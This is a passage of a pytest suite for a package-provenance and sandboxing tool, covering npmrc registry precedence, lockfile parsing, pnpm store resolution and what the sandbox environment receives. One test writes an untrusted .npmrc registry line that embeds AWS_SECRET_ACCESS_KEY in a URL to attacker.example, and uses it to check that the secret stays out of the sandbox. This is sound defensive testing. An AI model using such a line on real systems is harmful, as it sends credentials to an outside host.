    """eslint 8.x: every 8.x release is deprecated ("no longer supported") while 9.x is current."""
    from packagealert.languages.node import NodeLanguage

    doc = _lines({"8.50.0": "no longer supported", "8.57.1": "no longer supported"},
                 ["8.50.0", "8.57.1", "9.0.0"], "9.0.0")
    assert NodeLanguage().yank_status_parse(doc, "8.50.0") == (False, None)


def test_the_newest_release_of_its_line_deprecated_is_end_of_life():
    """rimraf 3.0.2 is both deprecated and the last 3.x release."""
    from packagealert.languages.node import NodeLanguage

    doc = _lines({"3.0.2": "versions prior to v4 are no longer supported"}, ["3.0.1", "3.0.2", "4.0.0"], "4.0.0")
    assert NodeLanguage().yank_status_parse(doc, "3.0.2") == (False, None)


def test_a_deprecated_prerelease_superseded_by_a_release_on_its_line_is_yanked():
    """source-map 0.8.0-beta.0 is deprecated; 0.8.0, on the same (0.8) line, is not."""
    from packagealert.languages.node import NodeLanguage

    doc = _lines({"0.8.0-beta.0": "won't be included in future versions"}, ["0.8.0-beta.0", "0.8.0"], "0.8.0")
    assert NodeLanguage().yank_status_parse(doc, "0.8.0-beta.0") == (True, "won't be included in future versions")


def test_a_bad_release_on_an_older_line_is_still_yanked():
    """A withdrawn release on a line whose own newest release is fine, even when latest is a later major."""
    from packagealert.languages.node import NodeLanguage

    doc = _lines({"2.1.0": "Bad release."}, ["2.0.0", "2.1.0", "2.1.1", "3.0.0"], "3.0.0")
    assert NodeLanguage().yank_status_parse(doc, "2.1.0") == (True, "Bad release.")


def test_an_unreadable_version_elsewhere_in_the_document_is_skipped():
    from packagealert.languages.node import NodeLanguage

    doc = _lines({"4.18.0": "Bad release."}, ["4.18.0", "4.18.1", "not-a-version"], "4.18.1")
    assert NodeLanguage().yank_status_parse(doc, "4.18.0") == (True, "Bad release.")


def test_the_users_npmrc_applies_when_the_project_sets_no_registry(tmp_path, monkeypatch):
    from packagealert.languages import node

    user_rc = tmp_path / "user-npmrc"
    user_rc.write_text("@corp:registry=https://npm.corp.example/\n")
    monkeypatch.setattr(node, "_user_npmrc", lambda: user_rc)
    assert _pnpm_public(tmp_path) == {"a": True, "@corp/b": False}
    (tmp_path / ".npmrc").write_text("@corp:registry=https://registry.npmjs.org/\n")   # the project's wins
    assert _pnpm_public(tmp_path) == {"a": True, "@corp/b": True}


@pytest.mark.parametrize(("lines", "expected"), [
    # npm's INI parser keeps the last assignment of a key within one file
    ("registry=https://registry.npmjs.org/\nregistry=https://npm.corp.example/\n", {"a": False, "@corp/b": False}),
    ("registry=https://npm.corp.example/\nregistry=https://registry.npmjs.org/\n", {"a": True, "@corp/b": True}),
    ("@corp:registry=https://registry.npmjs.org/\n@corp:registry=https://npm.corp.example/\n",
     {"a": True, "@corp/b": False}),
])
def test_the_last_assignment_in_an_npmrc_wins(tmp_path, lines, expected):
    (tmp_path / ".npmrc").write_text(lines)
    assert _pnpm_public(tmp_path) == expected


def test_the_last_assignment_in_the_users_npmrc_wins_when_the_project_sets_none(tmp_path, monkeypatch):
    from packagealert.languages import node

    user_rc = tmp_path / "user-npmrc"
    user_rc.write_text("registry=https://registry.npmjs.org/\nregistry=https://npm.corp.example/\n")
    monkeypatch.setattr(node, "_user_npmrc", lambda: user_rc)
    assert _pnpm_public(tmp_path) == {"a": False, "@corp/b": False}


@pytest.mark.parametrize("var", ["npm_config_registry", "NPM_CONFIG_REGISTRY"])
def test_a_registry_set_in_the_environment_wins_over_npmrc(tmp_path, monkeypatch, var):
    monkeypatch.setenv(var, "https://npm.corp.example/")
    (tmp_path / ".npmrc").write_text("registry=https://registry.npmjs.org/\n")
    assert _pnpm_public(tmp_path) == {"a": False, "@corp/b": False}


def test_a_scoped_registry_set_in_the_environment_applies_to_that_scope(tmp_path, monkeypatch):
    monkeypatch.setenv("npm_config_@corp:registry", "https://npm.corp.example/")
    assert _pnpm_public(tmp_path) == {"a": True, "@corp/b": False}


def test_npm_config_userconfig_moves_the_users_npmrc(tmp_path, monkeypatch):
    from packagealert.languages import node

    monkeypatch.setattr(_node, "_user_npmrc", _REAL_USER_NPMRC)   # the real lookup of npm_config_userconfig
    rc = tmp_path / "elsewhere.npmrc"
    rc.write_text("registry=https://npm.corp.example/\n")
    monkeypatch.setenv("npm_config_userconfig", str(rc))
    assert node._user_npmrc() == rc
    assert _pnpm_public(tmp_path) == {"a": False, "@corp/b": False}


def test_workspace_and_local_package_entries_are_never_public(tmp_path):
    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "": {"name": "app", "workspaces": ["packages/*"]},
        "node_modules/internal": {"resolved": "packages/internal", "link": True},
        "packages/internal": {"name": "internal", "version": "1.0.0"},
        "packages/internal/node_modules/dep": {
            "version": "2.0.0", "resolved": "https://registry.npmjs.org/dep/-/dep-2.0.0.tgz"},
        "node_modules/registry-dep": {"version": "3.0.0"},
    }}))
    found = {p.name: p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)}
    # The workspace member (and its link) is local; its own registry dependency, and an entry the
    # configured (public) registry supplies, are public.
    assert found == {"internal": False, "dep": True, "registry-dep": True}


def test_a_package_declared_by_url_is_not_public_however_its_resolved_url_looks(tmp_path):
    """A URL dependency can be locked with a plain version and a registry-shaped resolved URL."""
    tarball = "https://registry.npmjs.org/b/-/b-9.0.0.tgz"
    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "": {"name": "app", "dependencies": {"a": "https://example.com/a/-/a-1.0.0.tgz", "b": "^1.0.0", "p": "^1.0.0"}},
        "node_modules/a": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz"},
        "node_modules/b": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/b/-/b-1.0.0.tgz"},
        "node_modules/p": {"version": "1.0.0", "resolved": "https://registry.npmjs.org/p/-/p-1.0.0.tgz",
                           "dependencies": {"b": tarball}},
        "node_modules/p/node_modules/b": {"version": "9.0.0", "resolved": tarball},
    }}))
    found = {(p.name, p.version): p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)}
    # Only the copy the URL declaration resolves to: the registry copy of b at the top stays public.
    assert found == {("a", "1.0.0"): False, ("b", "1.0.0"): True, ("p", "1.0.0"): True, ("b", "9.0.0"): False}


def test_a_package_lock_v1_file_dependency_is_not_public(tmp_path):
    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 1, "dependencies": {
        "local": {"version": "file:../local"}, "reg": {"version": "1.0.0"}}}))
    found = {p.name: p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)}
    assert found == {"local": False, "reg": True}


@pytest.mark.parametrize("with_package_json", [True, False])
def test_a_yarn_local_dependency_without_resolved_is_not_public(tmp_path, with_package_json):
    if with_package_json:
        (tmp_path / "package.json").write_text(json.dumps(
            {"dependencies": {"internal-local": "file:../local", "reg": "^1.0.0"}}))
    (tmp_path / "yarn.lock").write_text(
        '"internal-local@file:../local":\n  version "1.0.0"\n\n'
        'reg@^1.0.0:\n  version "1.0.0"\n  resolved "https://registry.yarnpkg.com/reg/-/reg-1.0.0.tgz#abc"\n\n'
        '"gitdep@github:o/gitdep":\n  version "2.0.0"\n')
    found = {p.name: p.from_public_registry for p in NodeLanguage()._parse_yarn_lock(tmp_path / "yarn.lock")}
    assert found == {"internal-local": False, "reg": True, "gitdep": False}


def test_npmrc_environment_references_are_expanded(tmp_path, monkeypatch):
    (tmp_path / ".npmrc").write_text("registry=${NPM_REGISTRY}\n@corp:registry=${CORP_REGISTRY}\n")
    monkeypatch.setenv("NPM_REGISTRY", "https://registry.npmjs.org/")
    monkeypatch.setenv("CORP_REGISTRY", "https://npm.corp.example/")
    assert _pnpm_public(tmp_path) == {"a": True, "@corp/b": False}


def test_an_unset_npmrc_reference_is_not_taken_as_public(tmp_path, monkeypatch):
    monkeypatch.delenv("NPM_REGISTRY", raising=False)
    (tmp_path / ".npmrc").write_text("registry=${NPM_REGISTRY}\n")
    assert _pnpm_public(tmp_path) == {"a": False, "@corp/b": False}


def test_an_optional_npmrc_reference_that_is_unset_leaves_the_default(tmp_path, monkeypatch):
    monkeypatch.delenv("NPM_REGISTRY", raising=False)
    (tmp_path / ".npmrc").write_text("registry=${NPM_REGISTRY?}\n")
    assert _pnpm_public(tmp_path) == {"a": True, "@corp/b": True}


def test_the_sandbox_gets_the_registry_settings_provenance_reads(tmp_path, monkeypatch):
    """npm in the sandbox must fetch from the registry the provenance check assumed, so the same variables pass."""
    from packagealert.sandbox.runner import _build_sandbox_env

    rc = tmp_path / "corp.npmrc"
    rc.write_text("registry=https://npm.corp.example/\n")
    monkeypatch.setenv("npm_config_registry", "https://npm.corp.example/")
    monkeypatch.setenv("NPM_CONFIG_@corp:registry", "https://npm.corp.example/")
    monkeypatch.setenv("npm_config_userconfig", str(rc))
    monkeypatch.setenv("npm_config_//npm.corp.example/:_authToken", "secret")
    monkeypatch.setenv("npm_config_loglevel", "silly")
    env = _build_sandbox_env([])
    assert env["npm_config_registry"] == "https://npm.corp.example/"
    assert env["NPM_CONFIG_@corp:registry"] == "https://npm.corp.example/"
    assert env["npm_config_userconfig"] == str(rc)
    assert "npm_config_//npm.corp.example/:_authToken" not in env      # credentials stay out
    assert "npm_config_loglevel" not in env


def test_a_moved_userconfig_is_bound_into_the_sandbox(tmp_path, monkeypatch):
    from packagealert.languages import node
    from packagealert.languages.node import NodeLanguage

    monkeypatch.setattr(_node, "_user_npmrc", _REAL_USER_NPMRC)   # the real lookup of npm_config_userconfig
    rc = tmp_path / "corp.npmrc"
    rc.write_text("registry=https://npm.corp.example/\n")
    monkeypatch.setenv("npm_config_userconfig", str(rc))
    assert node._user_npmrc() == rc
    assert rc in NodeLanguage().home_ro_paths()


_RC_WITH_REFS = ("registry=${CORP_REGISTRY}\n"
                 "@corp:registry=${CORP_SCOPE_REGISTRY?}\n"
                 "//npm.corp.example/:_authToken=${NPM_TOKEN}\n")


def _set_refs(monkeypatch):
    monkeypatch.setenv("CORP_REGISTRY", "https://npm.corp.example/")
    monkeypatch.setenv("CORP_SCOPE_REGISTRY", "https://npm.corp.example/scoped/")
    monkeypatch.setenv("NPM_TOKEN", "secret")


def test_variables_the_users_registry_lines_refer_to_reach_the_sandbox(tmp_path, monkeypatch):
    """The user's own .npmrc is trusted: a registry of ${VAR} there expands inside the sandbox as on the host."""
    from packagealert.languages import node
    from packagealert.sandbox.runner import _build_sandbox_env

    _set_refs(monkeypatch)
    rc = tmp_path / "user-npmrc"
    rc.write_text(_RC_WITH_REFS)
    monkeypatch.setattr(node, "_user_npmrc", lambda: rc)
    monkeypatch.chdir(tmp_path)
    env = _build_sandbox_env([])
    assert env["CORP_REGISTRY"] == "https://npm.corp.example/"
    assert env["CORP_SCOPE_REGISTRY"] == "https://npm.corp.example/scoped/"
    assert "NPM_TOKEN" not in env                      # a credential line's reference is not passed


def test_a_project_npmrc_cannot_pull_host_variables_into_the_sandbox(tmp_path, monkeypatch):
    """A repository's .npmrc is untrusted: registry=https://${SECRET}@attacker/ must not expose SECRET."""
    from packagealert.languages.node import NodeLanguage
    from packagealert.sandbox.runner import _build_sandbox_env

    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "s3cr3t")
    (tmp_path / ".npmrc").write_text("registry=https://${AWS_SECRET_ACCESS_KEY}@attacker.example/\n"
                                     "@corp:registry=${AWS_SECRET_ACCESS_KEY?}\n")
    monkeypatch.chdir(tmp_path)
    assert "AWS_SECRET_ACCESS_KEY" not in _build_sandbox_env([])
    env: dict[str, str] = {}
    NodeLanguage().prepare_sandbox_env(None, tmp_path, env)
    assert "AWS_SECRET_ACCESS_KEY" not in env


def test_a_project_npmrc_reference_is_judged_as_the_sandbox_sees_it(tmp_path, monkeypatch):
    """Inside pa run, the project's registry=${VAR?} expands from the sandbox's environment: unset there, npm
    uses the public default, so its packages are public (checked), whatever the host's VAR says."""
    from packagealert.parsers.process_args import SANDBOX_ENV

    monkeypatch.setenv("CORP_REGISTRY", "https://npm.corp.example/")
    (tmp_path / ".npmrc").write_text("registry=${CORP_REGISTRY?}\n")
    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "": {"name": "app", "dependencies": {"a": "^1.0.0"}}, "node_modules/a": {"version": "1.0.0"}}}))

    def public():
        return [p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)]

    assert public() == [False]                              # outside the sandbox: the host's private registry
    token = SANDBOX_ENV.set({})
    try:
        assert public() == [True]
        SANDBOX_ENV.set({"CORP_REGISTRY": "https://npm.corp.example/"})   # passed with --env
        assert public() == [False]
    finally:
        SANDBOX_ENV.reset(token)


def test_a_relative_userconfig_is_taken_from_the_invocation_directory(tmp_path, monkeypatch):
    """npm resolves a relative userconfig against its working directory; the sandbox needs an absolute bind."""
    from packagealert.languages import node
    from packagealert.languages.node import NodeLanguage

    monkeypatch.setattr(_node, "_user_npmrc", _REAL_USER_NPMRC)   # the real lookup of npm_config_userconfig
    (tmp_path / "cfg").mkdir()
    rc = tmp_path / "cfg" / "corp.npmrc"
    rc.write_text("registry=https://npm.corp.example/\n")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("npm_config_userconfig", "cfg/corp.npmrc")
    assert node._user_npmrc() == rc
    assert rc in NodeLanguage().home_ro_paths()


def test_the_sandbox_is_given_the_userconfig_as_an_absolute_path(tmp_path, monkeypatch):
    """A trial runs npm in its scratch copy, where a relative userconfig would name another file."""
    from packagealert.languages.node import NodeLanguage

    monkeypatch.setattr(_node, "_user_npmrc", _REAL_USER_NPMRC)   # the real lookup of npm_config_userconfig
    (tmp_path / "cfg").mkdir()
    (tmp_path / "cfg" / "corp.npmrc").write_text("registry=https://npm.corp.example/\n")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("NPM_CONFIG_USERCONFIG", "cfg/corp.npmrc")
    env = {"NPM_CONFIG_USERCONFIG": "cfg/corp.npmrc"}
    NodeLanguage().prepare_sandbox_env(None, tmp_path / "scratch", env)
    assert env["NPM_CONFIG_USERCONFIG"] == str(tmp_path / "cfg" / "corp.npmrc")


def test_the_running_commands_registry_decides_url_less_lock_entries(tmp_path):
    """npm install --registry <private> writes URL-less entries (omit-lockfile-registry-resolved) from that registry."""
    from packagealert.parsers.process_args import COMMAND_LINE_REGISTRIES

    lock = tmp_path / "package-lock.json"
    lock.write_text(json.dumps({"lockfileVersion": 3, "packages": {
        "": {"name": "app", "dependencies": {"a": "^1.0.0", "@corp/b": "^1.0.0"}},
        "node_modules/a": {"version": "1.0.0"},
        "node_modules/@corp/b": {"version": "1.0.0"},
    }}))

    def public():
        return {p.name: p.from_public_registry for p in NodeLanguage()._parse_package_lock(lock)}

    assert public() == {"a": True, "@corp/b": True}
    for given, expected in [({"registry": "https://npm.corp.example/"}, {"a": False, "@corp/b": False}),
                            ({"@corp:registry": "https://npm.corp.example/"}, {"a": True, "@corp/b": False})]:
        token = COMMAND_LINE_REGISTRIES.set(given)
        try:
            assert public() == expected
        finally:
            COMMAND_LINE_REGISTRIES.reset(token)
    assert public() == {"a": True, "@corp/b": True}


def _installed(tmp_path, entries, *, hidden=True):
    """A node_modules after an install: each package's package.json, and npm's hidden lock describing them."""
    nm = tmp_path / "node_modules"
    for name, (version, resolved) in entries.items():
        (nm / name).mkdir(parents=True)
        (nm / name / "package.json").write_text(json.dumps({"name": name, "version": version}))
    lock = {"name": "app", "lockfileVersion": 3, "packages": {
        f"node_modules/{n}": {"version": v, **({"resolved": r} if r else {})} for n, (v, r) in entries.items()}}
    (nm / ".package-lock.json" if hidden else tmp_path / "package-lock.json").write_text(json.dumps(lock))
    return nm, {nm / n / "package.json" for n in entries}


@pytest.mark.parametrize("hidden", [True, False])
def test_new_packages_carry_their_registry_provenance(tmp_path, hidden):
    nm, new = _installed(tmp_path, {
        "pub": ("1.0.0", "https://registry.npmjs.org/pub/-/pub-1.0.0.tgz"),
        "priv": ("1.0.0", "https://npm.corp.example/priv/-/priv-1.0.0.tgz"),
        "@corp/x": ("1.0.0", None),
    }, hidden=hidden)
    found = {p.name: p.from_public_registry for p in NodeLanguage().detect_new_packages(new, nm)}
    assert found == {"pub": True, "priv": False, "@corp/x": True}


def test_new_url_less_packages_follow_the_commands_registry(tmp_path):
    from packagealert.parsers.process_args import COMMAND_LINE_REGISTRIES

    nm, new = _installed(tmp_path, {"evil": ("1.0.0", None)})
    token = COMMAND_LINE_REGISTRIES.set({"registry": "https://npm.corp.example/"})
    try:
        assert [p.from_public_registry for p in NodeLanguage().detect_new_packages(new, nm)] == [False]
    finally:
        COMMAND_LINE_REGISTRIES.reset(token)


def test_a_new_package_with_no_lock_entry_follows_the_configured_registry(tmp_path):
    nm = tmp_path / "node_modules"
    (nm / "evil").mkdir(parents=True)
    (nm / "evil" / "package.json").write_text('{"name": "evil", "version": "1.0.0"}')
    (tmp_path / ".npmrc").write_text("registry=https://npm.corp.example/\n")
    found = NodeLanguage().detect_new_packages({nm / "evil" / "package.json"}, nm)
    assert [(p.name, p.from_public_registry) for p in found] == [("evil", False)]


@pytest.mark.parametrize("declared_in", ["package-lock.json", "package.json"])
def test_a_new_url_dependency_is_not_public_however_its_resolved_url_looks(tmp_path, declared_in):
    """npm's hidden lock has no root entry, so the root's declarations come from the project lock (or package.json):
    a dependency declared by URL is not the registry package of that name."""
    tarball = "https://registry.npmjs.org/a/-/a-1.0.0.tgz"
    nm, new = _installed(tmp_path, {"a": ("1.0.0", tarball), "b": ("1.0.0", "https://registry.npmjs.org/b/-/b-1.0.0.tgz")})
    root = {"name": "app", "dependencies": {"a": "https://example.com/a/-/a-1.0.0.tgz", "b": "^1.0.0"}}
    if declared_in == "package-lock.json":
        (tmp_path / "package-lock.json").write_text(json.dumps({"lockfileVersion": 3, "packages": {
            "": root, "node_modules/a": {"version": "1.0.0", "resolved": tarball}}}))
    else:
        (tmp_path / "package.json").write_text(json.dumps(root))
    found = {p.name: p.from_public_registry for p in NodeLanguage().detect_new_packages(new, nm)}
    assert found == {"a": False, "b": True}


@pytest.mark.parametrize(("line", "value"), [
    ("registry=https://${SECRET_VAR}@registry.example/", "npm_TOKEN123"),            # credentials in the URL
    ("@corp:registry=https://npm.fury.io/${SECRET_VAR}/corp/", "TOKEN123"),           # a token in the path
    ("registry=${SECRET_VAR}", "https://user:TOKEN123@npm.corp.example/"),           # a URL carrying credentials
    ("registry=${SECRET_VAR}", "not a url"),
])
def test_a_variable_that_may_carry_a_credential_is_not_passed_into_the_sandbox(tmp_path, monkeypatch, line, value):
    """Only a registry line that is a whole credential-free URL variable is forwarded; anything else stays on the
    host, where sandboxed package code cannot read it."""
    from packagealert.sandbox.runner import _build_sandbox_env

    monkeypatch.setenv("SECRET_VAR", value)
    rc = tmp_path / "user-npmrc"
    rc.write_text(line + "\n")
    monkeypatch.setattr(_node, "_user_npmrc", lambda: rc)
    monkeypatch.chdir(tmp_path)
    assert "SECRET_VAR" not in _build_sandbox_env([])


def test_the_users_npmrc_is_judged_as_the_sandbox_expands_it(tmp_path, monkeypatch):
    """A user registry line the sandbox cannot expand is judged with the sandbox's environment, as npm there sees it."""
    from packagealert.parsers.process_args import SANDBOX_ENV

    monkeypatch.setenv("CORP_HOST", "npm.corp.example")
    rc = tmp_path / "user-npmrc"
    rc.write_text("registry=https://${CORP_HOST?}/\n")
    monkeypatch.setattr(_node, "_user_npmrc", lambda: rc)
    assert _node.npm_registries(tmp_path)[0] == "https://npm.corp.example/"     # on the host
    token = SANDBOX_ENV.set({})
    try:
        assert _node.npm_registries(tmp_path)[0] == "https:///"                 # in the sandbox: not expanded
    finally:
        SANDBOX_ENV.reset(token)


@pytest.mark.parametrize("var", ["npm_config_registry", "NPM_CONFIG_REGISTRY", "npm_config_@corp:registry"])
def test_a_registry_variable_carrying_credentials_stays_out_of_the_sandbox(tmp_path, monkeypatch, var):
    from packagealert.sandbox.runner import _build_sandbox_env

    monkeypatch.setenv(var, "https://user:TOKEN123@npm.corp.example/")
    assert var not in _build_sandbox_env([])
    monkeypatch.setenv(var, "https://npm.corp.example/")                     # a plain address still passes
    assert _build_sandbox_env([])[var] == "https://npm.corp.example/"


def test_a_registry_variable_left_out_of_the_sandbox_is_not_applied_there(tmp_path, monkeypatch):
    """Provenance inside the sandbox uses the variables npm there gets: one carrying credentials is not among them."""
    from packagealert.parsers.process_args import SANDBOX_ENV
    from packagealert.sandbox.runner import _build_sandbox_env

    monkeypatch.setenv("npm_config_registry", "https://user:TOKEN@npm.corp.example/")
    assert _node.npm_registries(tmp_path)[0] == "https://user:TOKEN@npm.corp.example/"       # on the host
    token = SANDBOX_ENV.set(_build_sandbox_env([]))
    try:
        assert _node.npm_registries(tmp_path)[0] is None                                        # npm's default
    finally:
        SANDBOX_ENV.reset(token)


def _pnpm_isolated_layout(project: Path) -> Path:
    """pnpm's default isolated layout (as pnpm 11.28.6 writes it): each package in the
    virtual store under node_modules/.pnpm, a direct dependency linked from node_modules,
    and a package's dependencies linked beside it inside the store."""
    nm = project / "node_modules"
    store = nm / ".pnpm"
    evil = store / "evilpkg@1.0.0" / "node_modules" / "evilpkg"
    dep = store / "@corp+dep@2.0.0" / "node_modules" / "@corp" / "dep"
    local = store / "localpkg@file+..+localpkg-3.0.0.tgz" / "node_modules" / "localpkg"
    for d, name, version in ((evil, "evilpkg", "1.0.0"), (dep, "@corp/dep", "2.0.0"), (local, "localpkg", "3.0.0")):
        d.mkdir(parents=True)
        (d / "package.json").write_text(json.dumps({"name": name, "version": version}))
        (d / "index.js").write_text("module.exports = 1;\n")
    (nm / "evilpkg").symlink_to(Path(".pnpm/evilpkg@1.0.0/node_modules/evilpkg"))
    (nm / "localpkg").symlink_to(Path(".pnpm/localpkg@file+..+localpkg-3.0.0.tgz/node_modules/localpkg"))
    (store / "evilpkg@1.0.0" / "node_modules" / "@corp").mkdir()
    (store / "evilpkg@1.0.0" / "node_modules" / "@corp" / "dep").symlink_to(
        Path("../../../@corp+dep@2.0.0/node_modules/@corp/dep"))
    return nm


def test_post_install_scan_finds_pnpm_virtual_store_packages(tmp_path, monkeypatch):
    """The real collector over a real isolated layout: every package pnpm installed is
    found, direct and transitive, and a file: dependency is scanned but not looked up."""
    from packagealert.sandbox.runner import _collect_new_packages

    monkeypatch.delenv("npm_config_registry", raising=False)
    nm = _pnpm_isolated_layout(tmp_path)
    non_public: set = set()
    found = _collect_new_packages([nm], {}, "npm", non_public=non_public)
    assert sorted((name, version) for _eco, name, version, _root in found) == [
        ("@corp/dep", "2.0.0"), ("evilpkg", "1.0.0"), ("localpkg", "3.0.0")]
    assert {name for _eco, name, _v, _root in non_public} == {"localpkg"}


def test_pnpm_virtual_store_manifest_outside_the_walk_root_is_ignored(tmp_path):
    outside = tmp_path / "outside" / "evilpkg"
    outside.mkdir(parents=True)
    (outside / "package.json").write_text(json.dumps({"name": "evilpkg", "version": "1.0.0"}))
    nm = tmp_path / "proj" / "node_modules"
    entry = nm / ".pnpm" / "evilpkg@1.0.0" / "node_modules"
    entry.mkdir(parents=True)
    (entry / "evilpkg").symlink_to(outside)
    manifest = entry / "evilpkg" / "package.json"
    assert NodeLanguage().detect_new_packages({manifest}, nm) == []


def test_resolve_package_dir_finds_a_transitive_pnpm_package(tmp_path):
    """A transitive dependency has no node_modules/<name> link in the isolated layout;
    its source is found in the virtual store by name and version."""
    nm = _pnpm_isolated_layout(tmp_path)
    lang = NodeLanguage()
    assert lang.resolve_package_dir("@corp/dep", tmp_path, nm, "2.0.0") == [
        (nm / ".pnpm" / "@corp+dep@2.0.0" / "node_modules" / "@corp" / "dep").resolve()]
    assert lang.resolve_package_dir("evilpkg", tmp_path, nm, "1.0.0") == [
        (nm / ".pnpm" / "evilpkg@1.0.0" / "node_modules" / "evilpkg").resolve()]
    assert lang.resolve_package_dir("@corp/dep", tmp_path, nm, "9.9.9") == []


def test_resolve_package_dir_prefers_the_matching_pnpm_version(tmp_path):
    """The top-level link is the direct dependency's version; an older copy deeper in the
    store is a separate package, and its own source is the one to scan."""
    nm = _pnpm_isolated_layout(tmp_path)
    old = nm / ".pnpm" / "evilpkg@0.9.0" / "node_modules" / "evilpkg"
    old.mkdir(parents=True)
    (old / "package.json").write_text(json.dumps({"name": "evilpkg", "version": "0.9.0"}))
    assert NodeLanguage().resolve_package_dir("evilpkg", tmp_path, nm, "0.9.0") == [old.resolve()]


def test_resolve_package_dir_ignores_a_store_entry_linking_outside(tmp_path):
    nm = _pnpm_isolated_layout(tmp_path)
    outside = tmp_path / "elsewhere" / "@corp" / "dep"
    outside.mkdir(parents=True)
    (outside / "package.json").write_text(json.dumps({"name": "@corp/dep", "version": "5.0.0"}))
    entry = nm / ".pnpm" / "@corp+dep@5.0.0" / "node_modules"
    entry.mkdir(parents=True)
    (entry / "@corp").symlink_to(tmp_path / "elsewhere" / "@corp")
    assert NodeLanguage().resolve_package_dir("@corp/dep", tmp_path, nm, "5.0.0") == []


def test_registry_copy_beside_a_file_copy_of_the_same_version_is_looked_up(tmp_path, monkeypatch):
    """Both copies collapse into one (name, version) entry; it is kept out of lookups
    only when every copy is non-public, so the registry copy is still checked."""
    from packagealert.sandbox.runner import _collect_new_packages

    monkeypatch.delenv("npm_config_registry", raising=False)
    store = tmp_path / "node_modules" / ".pnpm"
    for store_id in ("evilpkg@file+..+evilpkg-1.0.0.tgz", "evilpkg@1.0.0"):
        d = store / store_id / "node_modules" / "evilpkg"
        d.mkdir(parents=True)
        (d / "package.json").write_text(json.dumps({"name": "evilpkg", "version": "1.0.0"}))
    non_public: set = set()
    found = _collect_new_packages([tmp_path / "node_modules"], {}, "npm", non_public=non_public)
    assert [(n, v) for _e, n, v, _r in found] == [("evilpkg", "1.0.0")]
    assert non_public == set()


def test_resolve_package_dir_returns_every_copy_of_the_version(tmp_path):
    """Peer-context entries and a file: tarball can each hold the same version; each is
    its own copy and is scanned. An unversioned top-level directory is no match."""
    nm = _pnpm_isolated_layout(tmp_path)
    copies = []
    for store_id in ("evilpkg@1.0.0_react@18.0.0", "evilpkg@file+..+evilpkg-1.0.0.tgz"):
        d = nm / ".pnpm" / store_id / "node_modules" / "evilpkg"
        d.mkdir(parents=True)
        (d / "package.json").write_text(json.dumps({"name": "evilpkg", "version": "1.0.0"}))
        copies.append(d.resolve())
    found = NodeLanguage().resolve_package_dir("evilpkg", tmp_path, nm, "1.0.0")
    linked = (nm / ".pnpm" / "evilpkg@1.0.0" / "node_modules" / "evilpkg").resolve()
    assert sorted(found) == sorted([linked, *copies])

    (nm / "unversioned").mkdir()
    (nm / "unversioned" / "package.json").write_text(json.dumps({"name": "unversioned"}))
    assert NodeLanguage().resolve_package_dir("unversioned", tmp_path, nm, "1.0.0") == []


def test_resolve_package_dir_looks_in_the_store_past_a_workspace_link(tmp_path):
    """A top-level link to a workspace outside node_modules is not this install's copy,
    but a registry version of the same name in the store is."""
    project = tmp_path / "proj"
    nm = project / "node_modules"
    workspace = tmp_path / "workspace" / "lib"
    workspace.mkdir(parents=True)
    (workspace / "package.json").write_text(json.dumps({"name": "lib", "version": "0.0.1"}))
    stored = nm / ".pnpm" / "lib@2.0.0" / "node_modules" / "lib"
    stored.mkdir(parents=True)
    (stored / "package.json").write_text(json.dumps({"name": "lib", "version": "2.0.0"}))
    (nm / "lib").symlink_to(workspace)
    lang = NodeLanguage()
    assert lang.resolve_package_dir("lib", project, nm, "2.0.0") == [stored.resolve()]
    assert lang.resolve_package_dir("lib", project, nm, "0.0.1") == []


def test_store_is_listed_once_and_only_matching_entries_resolved(tmp_path, monkeypatch):
    """Post-install scoring resolves every package; listing and resolving the whole
    store for each made a large install quadratic."""
    nm = _pnpm_isolated_layout(tmp_path)
    for i in range(200):
        (nm / ".pnpm" / f"other{i}@1.0.0" / "node_modules").mkdir(parents=True)
    _node._pnpm_store_entries.cache_clear()
    listed = []
    real_listdir = _node.os.listdir
    monkeypatch.setattr(_node.os, "listdir", lambda p: listed.append(p) or real_listdir(p))
    resolved = []
    real_resolve = Path.resolve
    monkeypatch.setattr(Path, "resolve", lambda self, *a, **k: resolved.append(self) or real_resolve(self, *a, **k))
    lang = NodeLanguage()
    for _ in range(20):
        assert lang.resolve_package_dir("@corp/dep", tmp_path, nm, "2.0.0")
    assert len(listed) == 1
    assert not any("other" in str(p) for p in resolved)


@pytest.mark.parametrize("public_first", [False, True])
def test_a_public_copy_keeps_the_version_in_lookups(tmp_path, monkeypatch, public_first):
    """Copies arrive in no fixed order; whichever comes first, a public copy of the same
    (name, version) keeps it in the lookups."""
    from packagealert.languages.base import PackageSpec
    from packagealert.sandbox import runner

    class _Lang:
        name = "stub"

        def detect_new_packages(self, new_paths, walk_root):
            specs = [PackageSpec(name="evilpkg", version="1.0.0", ecosystem="npm", from_public_registry=public)
                     for public in (False, True)]
            return specs[::-1] if public_first else specs

    monkeypatch.setattr(runner.lang_registry, "for_ecosystem", lambda eco: _Lang())
    nm = tmp_path / "node_modules"
    (nm / "x").mkdir(parents=True)
    non_public: set = set()
    found = runner._collect_new_packages([nm], {}, "npm", non_public=non_public)
    assert [(n, v) for _e, n, v, _r in found] == [("evilpkg", "1.0.0")]
    assert non_public == set()


def test_resolve_package_dir_finds_a_store_entry_shortened_inside_the_name(tmp_path):
    """pnpm cuts a long store id and appends a hash (depPathToFilename(): the first
    max-33 characters, `_`, 32 hex); with a long name the cut falls inside it."""
    name = "@corp/" + "a-very-long-package-name-" * 6
    escaped = name.replace("/", "+")
    store_id = f"{escaped}@1.0.0"[: 120 - 33] + "_" + "0123456789abcdef" * 2
    assert not store_id.startswith(escaped)
    nm = tmp_path / "node_modules"
    pkg = nm / ".pnpm" / store_id / "node_modules" / name
    pkg.mkdir(parents=True)
